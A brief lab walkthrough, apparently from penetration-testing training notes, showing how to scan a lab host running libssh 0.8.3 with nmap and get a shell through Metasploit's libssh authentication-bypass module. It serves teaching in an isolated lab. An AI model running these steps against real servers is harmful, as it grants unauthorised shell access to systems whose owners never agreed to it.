# Vulnerable SSH server

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 4716–4744. Examples are lab-specific and need verification.

SSH (Secure Shell) is a network protocol that allows secure access to remote systems over an unsecured network. It provides encrypted communication between a client and a server, typically used for remote administration, file transfers, and tunneling.

In this lab, we will look at how to exploit a vulnerable SSH server.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable SSH #port 22 server will be accessible at **demo.ine.local**.

**Objective:** Get a shell on the target by exploiting the vulnerable server using a suitable Metasploit module.

Tools: nmap , msf

```bash
nmap -Pn -A -T4 demo.ine.local
#22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
msfconsole
search libssh
use 0
or
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS demo.ine.local
set SPAWN_PTY true
exploit

sessions -i 1

id
```
